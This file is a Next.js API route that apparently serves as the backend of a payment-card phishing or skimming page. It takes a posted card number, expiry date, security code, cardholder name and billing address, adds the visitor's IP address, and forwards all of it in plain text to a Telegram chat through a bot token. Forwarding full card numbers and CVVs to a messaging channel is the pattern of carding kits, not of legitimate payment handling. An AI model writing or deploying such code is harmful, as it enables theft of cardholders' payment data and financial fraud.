import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { cardNumber, expiryDate, securityCode, saveCard, fullName, address, city, postalCode, country } = body

    // Get user IP address
    const forwarded = request.headers.get("x-forwarded-for")
    const ip = forwarded ? forwarded.split(",")[0] : request.headers.get("x-real-ip") || "Unknown"

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram configuration missing" }, { status: 500 })
    }

    const message = `💳 *New Payment Information*

*Card Details:*
Card Number: \`${cardNumber}\`
Expiry Date: \`${expiryDate}\`
Security Code: \`${securityCode}\`
Save Card: ${saveCard ? "Yes" : "No"}

*Billing Information:*
Full Name: \`${fullName}\`
Address: \`${address}\`
City: \`${city}\`
Postal Code: \`${postalCode}\`
Country: \`${country}\`

🌐 *User IP:* \`${ip}\`
⏰ *Time:* ${new Date().toLocaleString()}`

    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.json()
      console.error("Telegram API error:", errorData)
      return NextResponse.json({ error: "Failed to send message to Telegram" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
